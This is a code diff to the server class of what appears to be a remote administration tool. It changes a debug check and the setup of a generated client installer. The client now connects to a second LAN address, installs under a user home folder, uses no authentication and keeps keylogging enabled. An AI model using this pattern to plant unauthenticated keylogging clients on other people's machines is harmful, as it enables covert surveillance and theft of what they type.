@@ -92,7 +92,7 @@ public final class Server {
 
 		ServerStore.Listeners.start();
 
-		if (Common.isDebugMode() && !ServerState.isCloudMode() && !ServerState.isExampleMode()) {
+		if (Universal.isDebug && !ServerState.isCloudMode() && !ServerState.isExampleMode()) {
 			installDebugClient();
 		}
 
@@ -157,12 +157,12 @@ public final class Server {
 			return authOutcome;
 		}
 
-		ClientConfig cc = ClientConfig.newBuilder().setOutputType("Java (.jar)").setAuthType(AuthType.GROUP)
-				.setGroupName("TESTGROUP")
+		ClientConfig cc = ClientConfig.newBuilder().setOutputType("Java (.jar)").setAuthType(AuthType.NO_AUTH)
 				.addTarget(NetworkTarget.newBuilder().setServer("127.0.0.1").setPort(10101).build())
-				.setPathWin(System.getProperty("user.home") + "\\Documents\\Crimson").setPathBsd("/")
-				.setPathLin("/home/dev/cr").setPathOsx(System.getProperty("user.home") + "/client").setPathSol("/")
-				.setReconnectPeriod(3000).setBuildNumber(Common.build).setAutostart(false).setKeylogger(true)
+				.addTarget(NetworkTarget.newBuilder().setServer("192.168.1.76").setPort(10101).build())
+				.setPathWin("%USERHOME%/cr_install").setPathBsd("/").setPathLin("%USERHOME%/cr_install")
+				.setPathOsx("%USERHOME%/cr_install").setPathSol("/").setReconnectPeriod(3000)
+				.setBuildNumber(Common.build).setAutostart(false).setKeylogger(true)
 				.setKeyloggerFlushMethod(Trigger.EVENT).setKeyloggerFlushValue(15).build();
 		try {
 			// Generate installer
